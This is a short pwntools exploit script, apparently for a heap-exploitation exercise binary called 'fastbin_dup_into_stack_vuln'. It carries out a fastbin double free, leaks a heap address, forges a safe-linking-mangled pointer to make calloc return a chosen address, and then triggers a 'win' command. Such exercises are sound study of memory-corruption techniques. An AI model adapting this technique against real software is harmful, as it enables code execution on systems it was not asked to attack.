#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or './fastbin_dup_into_stack_vuln')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()
io.recvuntil(b'The address we want calloc() to return is')
target = int(io.recvline(), 16)
log.info(f"{target:016x}")

io.sendlineafter(b'>', b'calloc 0')
io.sendlineafter(b'>', b'calloc 1')
io.sendlineafter(b'>', b'free 0')
io.sendlineafter(b'>', b'free 1')
# Exploit Double free!
io.sendlineafter(b'>', b'free 0')

io.sendlineafter(b'>', b'calloc 2')
io.sendlineafter(b'>', b'calloc 3')
# Leak address of First
io.sendlineafter(b'>', b'show 2')
io.recvuntil(b'Addr allocations[2] = ')
leak = int(io.recvline(), 16)
log.info(f"{leak:016x}")
io.sendlineafter(b'>', b'read 2')
io.sendline(p64((target-0x10) ^ (leak >> 12)))
# Some Buffer shenanigans
io.sendlineafter(b'>', b'calloc 4')
io.sendlineafter(b'>', b'calloc 5')
io.sendlineafter(b'>', b'read 5')
io.sendline(p64(0xdeadbeef))
io.sendlineafter(b'>', b'win 5')

io.interactive()